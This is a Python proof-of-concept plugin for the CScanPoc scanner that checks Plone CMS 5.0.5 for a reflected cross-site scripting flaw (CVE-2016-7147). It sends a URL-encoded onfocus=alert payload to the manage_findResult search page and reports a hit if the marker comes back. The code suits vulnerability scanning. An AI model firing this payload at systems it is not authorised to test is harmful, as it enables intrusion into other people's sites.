# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'Plone-CMS_0001'  # 平台漏洞编号，留空
    name = 'Plone-CMS 5.0.5 Cross Site Scripting'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2019-09-05'  # 漏洞公布时间
    desc = '''
        PloneCMS是免费的、开放源代码的内容管理系统（Content Management System，CMS）。
        Description: The search functionality of the management interface is vulnerable
        to reflected XSS. As the input is echoed into an HMTL attribute, an attacker
        can use double quotes to escape the current attribute and add new attributes to
        enter a JavaScript context.
    '''  # 漏洞描述
    ref = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7147'  # 漏洞来源
    cnvd_id = 'CVE-2016-7147'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PloneCMS'  # 漏洞应用名称
    product_version = '5.0.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '04015308-c8c8-4891-a1b4-38fbad0abc09'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/Plone/manage_findResult?obj_metatypes%3Alist=all&obj_ids%3Atokens=%22+autofocus+onfocus%3dalert(cscan)%3E&obj_searchterm=&obj_mspec=%3C&obj_mtime=&search_sub%3Aint=1&btn_submit=Find'
            url = self.target + payload
            r = requests.get(url)

            if 'cscan' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/Plone/manage_findResult?obj_metatypes%3Alist=all&obj_ids%3Atokens=%22+autofocus+onfocus%3dalert(cscan)%3E&obj_searchterm=&obj_mspec=%3C&obj_mtime=&search_sub%3Aint=1&btn_submit=Find'
            url = self.target + payload
            r = requests.get(url)

            if 'cscan' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
